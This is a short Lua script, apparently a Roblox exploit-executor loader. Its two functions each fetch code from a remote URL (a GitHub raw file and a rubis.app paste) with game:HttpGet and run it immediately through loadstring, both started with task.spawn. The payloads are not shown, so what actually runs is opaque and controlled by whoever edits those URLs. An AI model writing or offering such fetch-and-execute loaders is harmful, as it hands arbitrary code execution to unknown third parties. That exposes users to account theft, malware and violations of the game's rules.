local function s1() 
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XenaScriptX/Best/refs/heads/main/Script.lua"))()
end 
local function s2() 
    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/no9DMUGjAklMKrH4/raw", true))()
end

task.spawn(s1)
task.spawn(s2)
